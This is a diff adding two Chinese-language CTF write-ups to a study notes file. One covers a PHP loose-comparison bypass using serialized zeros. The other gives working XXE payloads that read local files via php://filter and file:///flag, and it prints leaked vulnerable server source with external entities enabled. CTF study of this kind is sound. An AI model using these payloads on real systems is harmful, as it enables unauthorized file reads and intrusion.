@@ -1053,6 +1053,36 @@ echo serialize($a);
 
 ---
 
+
+## [HUBUCTF 2022 新生赛]checkin
+* 考点：反序列化,PHP,弱比较
+* 工具：hackbar，php
+
+https://www.nssctf.cn/problem/2602
+
+数组结构的序列化（可以对比类结构）：
+
+```php
+<?php
+$data_unserialize=[
+    "username"=>0,//"username"="this_is_secret"
+    "password"=>0//"password"="this_is_not_known_to_you"
+];
+// $username='this_is_secret';
+// $password='this_is_not_known_to_you';
+
+echo $data_unserialize['username']."\n";
+echo serialize($data_unserialize);
+?>
+```
+
+>在 PHP 中，0 == "任何非数字开头字符串" 都是 true，因此两个字段赋值为 0，可以让 if 弱比较成功。
+因此会有下面的这种条件成立的情况：
+
+```php
+0==$username&&0==$password //结果为true
+```
+
 ## 关于请求头：
 
 ### 请求头中使用下面的指定来源 ip ：
@@ -1224,6 +1254,75 @@ md52 = hashlib.md5(('/tmp/' + md51).encode('ascii')).hexdigest()
 
 print(md51)
 print(md52)
+```
+
+---
+
+## [NCTF 2019]Fake XML cookbook
+
+https://www.nssctf.cn/problem/1256
+
+
+* 考点：xml
+* 工具：yakit
+  
+在yakit中代理打开网页，获取发送的请求包，发现发送了username和password这两个字段，并且当我们发送了请求包后，会回显username字段的内容，所以这里可以通过编写xml外部实体注入实现文件读取:
+
+可以先编写下面的这个payload先获取登录的后端代码：(原理上也可以直接由这一步得到flag)
+```php
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE note [
+  <!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=./flag">
+  ]>
+<user><username>&admin;</username><password>123456</password></user>
+```
+
+可以得到下面的源码内容：
+
+```php
+<?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+
+$USERNAME = 'admin'; //è´¦å·
+$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //å¯ç 
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+
+try{
+	$dom = new DOMDocument();
+	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds->username;
+	$password = $creds->password;
+
+	if($username == $USERNAME && $password == $PASSWORD){
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
+	}else{
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
+	}	
+}catch(Exception $e){
+	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
+}
+
+header('Content-Type: text/html; charset=utf-8');
+echo $result;
+?>
+```
+
+发现只要我们发送的表单中包含了username字段，那么就可以实现回显，搜易可以构建下面的payload实现flag的读取：
+
+```php
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE note [
+  <!ENTITY admin SYSTEM "file:///flag">
+  ]>
+<user><username>&admin;</username></user>
 ```
 
 ---
